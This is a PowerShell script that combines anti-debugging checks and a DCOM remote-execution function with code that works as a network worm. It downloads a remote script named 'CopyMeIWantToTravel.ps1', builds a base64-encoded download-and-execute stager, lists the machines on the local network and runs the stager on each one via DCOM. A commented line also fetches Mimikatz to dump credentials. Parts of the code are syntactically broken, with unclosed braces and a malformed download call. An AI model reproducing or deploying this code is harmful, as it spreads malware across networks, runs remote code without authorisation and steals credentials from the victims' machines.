function Detect-Debug {
<#
.SYNOPSIS

	Use several techniques to detect the presence of a debugger. I realise 
	this does not make much sense from PowerShell (you may as well detect a
	text editor..) but there you go :)!

    Notes:

	* Using Kernel32::OutputDebugString does not appear to work in PowerShell.
	  In theory calling OutputDebugString, without a debugger attached, should
	  generate an error code. This lets you check if LastError has been
	  overwritten. Test case below:

	  [Kernel32]::SetLastError(0xb33f) # Set fake LastError
	  [Kernel32]::OutputDebugString("Hello Debugger!")
	  if ([Kernel32]::GetLastError() -eq 0xb33f) {
		echo "[?] OutputDebugString: Detected"
	  } else {
		echo "[?] OutputDebugString: False"
	  }

	* For bonus points call NtSetInformationThread::ThreadHideFromDebugger,
	  this will detach a thread from the debugger essentially making it
	  invisible! Test case below:
	  
	  $ThreadHandle = [Kernel32]::GetCurrentThread()
	  $CallResult = [Ntdll]::NtSetInformationThread($ThreadHandle, 17, [ref][IntPtr]::Zero, 0)
	  
	* I may update with some extra techniques (eg: Trap Flag) if I can find a
	  convenient way to run inline assembly (C style __asm). As it stands, it
	  is possible but cumbersome (= laziness prevails!).

    References:
	
	*  Anti Reverse Engineering Protection Techniques:
	   https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software
	*  Windows Anti-Debug Reference:
	   http://www.symantec.com/connect/articles/windows-anti-debug-reference

.DESCRIPTION

	Author: Ruben Boonen (@FuzzySec)
	Blog: http://www.fuzzysecurity.com/
	License: BSD 3-Clause
	Required Dependencies: PowerShell v2+
	Optional Dependencies: None
    
.EXAMPLE

	C:\PS> Detect-Debug
#>
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION
	{
		public Byte DebuggerEnabled;
		public Byte DebuggerNotPresent;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct _PROCESS_BASIC_INFORMATION
	{
		public IntPtr ExitStatus;
		public IntPtr PebBaseAddress;
		public IntPtr AffinityMask;
		public IntPtr BasePriority;
		public UIntPtr UniqueProcessId;
		public IntPtr InheritedFromUniqueProcessId;
	}
	
	[StructLayout(LayoutKind.Explicit, Size = 192)]
	public struct PEB_BeingDebugged_NtGlobalFlag
	{
		[FieldOffset(2)]
		public Byte BeingDebugged;
		[FieldOffset(104)]
		public UInt32 NtGlobalFlag32;
		[FieldOffset(188)]
		public UInt32 NtGlobalFlag64;
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll")]
		public static extern bool IsDebuggerPresent();
	
		[DllImport("kernel32.dll")]
		public static extern bool CheckRemoteDebuggerPresent(
			IntPtr hProcess,
			out bool pbDebuggerPresent);
	
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern void OutputDebugString(string lpOutputString);
	
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hObject);
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentThread();
	
		[DllImport("kernel32.dll")]
		public static extern void SetLastError(int dwErrorCode);
	
		[DllImport("kernel32.dll")]
		public static extern uint GetLastError();
	}
	
	public static class Ntdll
	{
		[DllImport("ntdll.dll")]
		public static extern int NtQuerySystemInformation(
			int SystemInformationClass,
			ref _SYSTEM_KERNEL_DEBUGGER_INFORMATION SystemInformation,
			int SystemInformationLength,
			ref int ReturnLength);
	
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
			IntPtr processHandle, 
			int processInformationClass,
			ref _PROCESS_BASIC_INFORMATION processInformation,
			int processInformationLength,
			ref int returnLength);
	
		[DllImport("ntdll.dll")]
		public static extern int NtSetInformationThread(
			IntPtr ThreadHandle, 
			int ThreadInformationClass,
			ref IntPtr ThreadInformation,
			int ThreadInformationLength);
	}
"@
	
	
	# (1) _SYSTEM_KERNEL_DEBUGGER_INFORMATION, kernel debugger detection
	#-----------
	$SYSTEM_KERNEL_DEBUGGER_INFORMATION = New-Object _SYSTEM_KERNEL_DEBUGGER_INFORMATION
	$SYSTEM_KERNEL_DEBUGGER_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($SYSTEM_KERNEL_DEBUGGER_INFORMATION)
	$SystemInformationLength = New-Object Int
	$CallResult = [Ntdll]::NtQuerySystemInformation(35, [ref]$SYSTEM_KERNEL_DEBUGGER_INFORMATION, $SYSTEM_KERNEL_DEBUGGER_INFORMATION_Size, [ref]$SystemInformationLength)
	if ($SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerEnabled -And !$SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerNotPresent) {
		$debug1 = 1
	} else {
		$debug1 = 0
	}
	
	# (2) CloseHandle exception check, generates exception in debugger
	#-----------
	$hObject = 0x1 # Invalid handle
	$Exception = "False"
	try {
		$CallResult = [Kernel32]::CloseHandle($hObject)
	} catch {
		$Exception = "Detected"
	} echo "$Exception"
	
	# (3) IsDebuggerPresent
	#-----------
	if ([Kernel32]::IsDebuggerPresent()) {
		$debug1 &= 1
	} else {
		$debug1 &= 0
	}
	
	# (4) CheckRemoteDebuggerPresent --> calls NtQueryInformationProcess::ProcessDebugPort under the hood
	#-----------
	$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
	$DebuggerPresent = [IntPtr]::Zero
	$CallResult = [Kernel32]::CheckRemoteDebuggerPresent($ProcHandle, [ref]$DebuggerPresent)
	if ($DebuggerPresent) {
		$debug1 &= 1
	} else {
		$debug1 &= 0	}
	
	# (5-6) PEB BeingDebugged & NtGlobalFlag checks
	#-----------
	$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
	$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
	$returnLength = New-Object Int
	$CallResult = [Ntdll]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
	
	# Lazy PEB parsing
	$PEB_BeingDebugged_NtGlobalFlag = New-Object PEB_BeingDebugged_NtGlobalFlag
	$PEB_BeingDebugged_NtGlobalFlag_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PEB_BeingDebugged_NtGlobalFlag)
	$PEB_BeingDebugged_NtGlobalFlag = $PEB_BeingDebugged_NtGlobalFlag.GetType()
	
	$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
	$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
	$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$PEB_BeingDebugged_NtGlobalFlag)
	
	if ($PEBFlags.BeingDebugged -eq 1) {
		$debug1 &= 1
	} else {
		$debug1 &= 0
	}
	
	# Our struct records what would be NtGlobalFlag for x32/x64
	if ($PEBFlags.NtGlobalFlag32 -eq 0x70 -Or $PEBFlags.NtGlobalFlag64 -eq 0x70) {
		$debug1 &= 1
	} else {
		$debug1 &= 0
	}
	
	# (7) Debug parent from child
	#-----------
	$ScriptBlock = {
		Add-Type -TypeDefinition @"
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;
		
		public static class Kernel32
		{
			[DllImport("kernel32.dll")]
			public static extern bool DebugActiveProcess(int dwProcessId);
			
			[DllImport("kernel32")]
			public static extern bool DebugActiveProcessStop(int ProcessId);
		}
"@
		$OwnPID = [System.Diagnostics.Process]::GetCurrentProcess().Id
		$ParentPID = (Get-WmiObject -Query "SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = $OwnPID").ParentProcessId
		if (![Kernel32]::DebugActiveProcess($ParentPID)) {
			$debug1 &= 1		} else {
			$debug1 &= 0
			$CallResult = [Kernel32]::DebugActiveProcessStop($ParentPID)
		}
	}
	
	# Start-Job launches $ScriptBlock as child process
	Start-Job -Name Self_Debug -ScriptBlock $ScriptBlock| Out-Null
	Wait-Job -Name Self_Debug| Out-Null
	Receive-Job -Name Self_Debug
	Remove-Job -Name Self_Debug
	echo $debug1
}
function Invoke-DCOM {
<#
    .SYNOPSIS

        Execute's commands via various DCOM methods as demonstrated by (@enigma0x3)
        http://www.enigma0x3.net

        Author: Steve Borosh (@rvrsh3ll)        
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Invoke commands on remote hosts via MMC20.Application COM object over DCOM.

    .PARAMETER ComputerName

        IP Address or Hostname of the remote system

    .PARAMETER Method

        Specifies the desired type of execution

    .PARAMETER Command

        Specifies the desired command to be executed

    .EXAMPLE

        Import-Module .\Invoke-DCOM.ps1
        Invoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command "calc.exe"
        Invoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command "calc.exe"
        Invoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart "MyService"
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
        [String]
        $ComputerName,

        [Parameter(Mandatory = $true, Position = 1)]
        [ValidateSet("MMC20.Application", "ShellWindows","ShellBrowserWindow","CheckDomain","ServiceCheck","MinimizeAll","ServiceStop","ServiceStart",
        "DetectOffice","RegisterXLL","ExcelDDE")]
        [String]
        $Method = "MMC20.Application",

        [Parameter(Mandatory = $false, Position = 2)]
        [string]
        $ServiceName,

        [Parameter(Mandatory = $false, Position = 3)]
        [string]
        $Command= "calc.exe",

        [Parameter(Mandatory = $false, Position = 4)]
        [string]
        $DllPath

    )

    Begin {

    #Declare some DCOM objects
       if ($Method -Match "ShellWindows") {

            [String]$DCOM = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'
        }
        
        elseif ($Method -Match "ShellBrowserWindow") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Method -Match "CheckDomain") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Method -Match "ServiceCheck") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Method -Match "MinimizeAll") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Method -Match "ServiceStop") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }

        elseif ($Method -Match "ServiceStart") {

            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
        }
    }
    
    
    Process {

        #Begin main process block

        #Check for which type we are using and apply options accordingly
        if ($Method -Match "MMC20.Application") {

            $Com = [Type]::GetTypeFromProgID("MMC20.Application","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $Obj.Document.ActiveView.ExecuteShellCommand($Command,$null,$null,"7")
        }
        elseif ($Method -Match "ShellWindows") {

            $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $Item = $Obj.Item()
            $Item.Document.Application.ShellExecute("cmd.exe","/c $Command","c:\windows\system32",$null,0)
        }

        elseif ($Method -Match "ShellBrowserWindow") {

            $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $Obj.Document.Application.ShellExecute("cmd.exe","/c $Command","c:\windows\system32",$null,0)
        }

        elseif ($Method -Match "CheckDomain") {

            $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $Obj.Document.Application.GetSystemInformation("IsOS_DomainMember")
        }

        elseif ($Method -Match "ServiceCheck") {

            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Document.Application.IsServiceRunning("$ServiceName")
        }

        elseif ($Method -Match "MinimizeAll") {

            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Document.Application.MinimizeAll()
        }

        elseif ($Method -Match "ServiceStop") {

            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Document.Application.ServiceStop("$ServiceName")
        }
        
        elseif ($Method -Match "ServiceStart") {

            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Document.Application.ServiceStart("$ServiceName")
        }
        elseif ($Method -Match "DetectOffice") {

            $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $isx64 = [boolean]$obj.Application.ProductCode[21]
            Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
        }
        elseif ($Method -Match "RegisterXLL") {

            $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $obj.Application.RegisterXLL("$DllPath")
        }
        elseif ($Method -Match "ExcelDDE") {

            $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
            $Obj = [System.Activator]::CreateInstance($Com)
            $Obj.DisplayAlerts = $false
            $Obj.DDEInitiate("cmd", "/c $Command")
        }
    }

    End {

        Write-Output "Completed"
    }
    

}
function Get-Creds { 
#IEX (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")
#$mem = Invoke-Mimikatz
#$reg = Invoke-Mimikatz -Command "priviledge::debug , token::elevate , lsadump::sam"
}
function Get-Link {
$links = "https://raw.githubusercontent.com/D3F4LT99/P0w3rsh3ll3d/master/CopyMeIWantToTravel.ps1"
$links &= "https://raw.githubusercontent.com/D3F4LT99/d3f4lt99.github.io/master/CopyMeIWantToTravel.ps1"
foreach ($link in $links) {
$error = 0
$TcpConnection = New-Object System.Net.Sockets.TcpClient
        try {
            $TcpConnection.Connect($link, "80")       
	} catch {
	    $error = 1
            $Tcpconnection.Close()
	Return 
	if ($error -eq 0) { 
	echo $link
	}
   }
}

function Kill-Viri {
echo "=====The World Wireless~=====" > $env:temp/powermng.dat
(Net.WebClient).DownloadFile(Get-Link, $env:temp/powermng.ps1
}

function Encode-Script {
$link = Get-Link 
$encz = "if (-NOT (Test-Path `$env:temp/powermng.ps1)) {IEX (New-Object Net.Webclient).DownloadString('$link') }"
$bytes = [Text.Encoding]::Unicode.GetBytes($encz)
$base = [Convert]::ToBase64String($bytes)
echo $base
}

function Infect-Network {
$networked_computers = net view /all | Where-Object {$_ -like "*\\*"}
foreach ($comp in $networked_computers) {
$ips &= [System.Net.Dns]::GetHostAddresses($comp)
foreach ($ip in $ips) {
Invoke-DCOM -ComputerName $ip -Method MMC20.Application -Command "powershell -sta -executionpolicy unrestricted -enc $(Encode-Script) "
}
}

if (Test-Path $env:temp/powermng.ps1) {
if (Test-Path $env:temp/powermng.dat) {
Infect-Network
}
} ELSE { 
Kill-Viri
Infect-Network
}
#if (-NOT (Test-Path $DestinationFile)) {
